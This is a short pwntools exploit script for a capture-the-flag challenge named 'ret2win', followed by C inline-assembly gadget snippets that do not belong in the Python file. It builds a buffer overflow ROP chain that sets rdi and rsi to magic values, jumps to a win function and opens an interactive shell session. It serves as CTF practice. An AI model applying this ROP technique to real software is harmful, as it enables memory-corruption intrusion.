#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./ret2win')
context.log_level = "error"

if args.REMOTE:
    # p = remote('ret2win.challenges.ctf.ritsec.club', 1337)
    pass
else:
    p = process(binary.path)

# gdb.attach(p)

pop_rdi = 0x4012b3
pop_rsi_r15 = 0x4012b1

payload = b""
payload += b"A"*40
payload += p64(pop_rdi)
payload += p64(0xcafebabe)
payload += p64(pop_rsi_r15)
payload += p64(0xc0debabe)
payload += p64(0x0)
# payload += p64(binary.functions.kelaspenuhrahasia.address)
payload += p64(0x401196)


p.sendline(payload)
p.stream()
p.interactive()

    __asm__(
        "pop %rdi\n"
        "ret\n"
        );


    __asm__(
        "pop %rsi\n"
        "pop %r15\n"
        "ret\n"
        );
